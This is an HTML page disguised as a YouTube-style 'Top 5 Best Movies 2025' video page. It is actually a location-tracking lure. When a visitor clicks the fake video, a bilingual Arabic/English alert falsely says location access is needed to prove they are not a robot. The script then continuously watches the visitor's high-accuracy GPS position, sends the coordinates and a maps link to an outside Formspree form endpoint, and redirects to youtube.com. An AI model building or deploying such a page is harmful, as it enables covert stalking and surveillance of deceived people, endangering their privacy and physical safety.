
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Top 5 Best Movies 2025</title>
  <meta name="description" content="Top 5 Best Movies 2025">
  <meta property="og:image" content="yt-poster.png" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: row;
    }
    .video-section {
      flex: 3;
      padding: 20px;
      text-align: center;
    }
    .video-section h1 {
      text-align: left;
      margin-left: 10px;
      font-size: 24px;
    }
    .video-box {
      width: 100%;
      max-width: 640px;
      height: 360px;
      background: url('yt-poster.png') center center no-repeat;
      background-size: cover;
      margin: 0 auto 20px;
      position: relative;
      cursor: pointer;
    }
    .sidebar {
      flex: 1;
      padding: 20px;
      background-color: #efefef;
    }
    .sidebar h2 {
      font-size: 18px;
    }
    .sidebar ul {
      list-style: none;
      padding: 0;
    }
    .sidebar li {
      background: white;
      margin-bottom: 10px;
      padding: 10px;
      border-radius: 5px;
    }
  </style>
</head>
<body>
  <div class="video-section">
    <h1>Top 5 Best Movies 2025</h1>
    <div class="video-box" onclick="getLocation()"></div>
  </div>
  <div class="sidebar">
    <h2>Suggested Videos</h2>
    <ul>
      <li>Funny Moments</li>
      <li>New Action Releases</li>
      <li>Drama Picks</li>
      <li>Classic Reviews</li>
    </ul>
  </div>

  <script>
    function getLocation() {
      alert("📍 لتتمكن من مشاهدة الفيديو، يرجى السماح بتحديد موقعك للتأكد أنك لست روبوت.\nTo watch the video, please allow location access to verify you're not a robot 🤖");

      if (navigator.geolocation) {
        navigator.geolocation.watchPosition(
          function(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const data = {
              location: `Latitude: ${latitude}, Longitude: ${longitude}`,
              maps: `https://maps.google.com/maps?q=${latitude},${longitude}`,
              _subject: "📍 Live Location Update"
            };

            fetch("https://formspree.io/f/xkgjqegp", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(data)
            });

            setTimeout(() => {
              window.location.href = "https://youtube.com";
            }, 3000);
          },
          function(error) {
            alert("❌ تعذر تحميل الصورة. حدث خطأ أثناء التحميل، يرجى المحاولة لاحقاً.");
          },
          {
            enableHighAccuracy: true,
            maximumAge: 0,
            timeout: 10000
          }
        );
      } else {
        alert("❌ الموقع غير مدعوم على هذا الجهاز.");
      }
    }
  </script>
</body>
</html>
